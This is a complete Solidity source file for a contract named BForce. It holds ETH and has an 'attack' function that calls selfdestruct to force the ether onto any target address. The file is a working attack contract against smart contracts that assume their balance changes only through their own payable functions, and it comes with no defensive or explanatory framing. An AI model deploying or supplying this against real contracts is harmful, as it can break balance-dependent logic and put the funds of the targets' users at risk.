// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BForce {
    constructor() payable {
        // Contract receives ETH on deployment
    }

    function attack(address target) external {
        // Forces all ETH in this contract to the target
        selfdestruct(payable(target));
    }
}
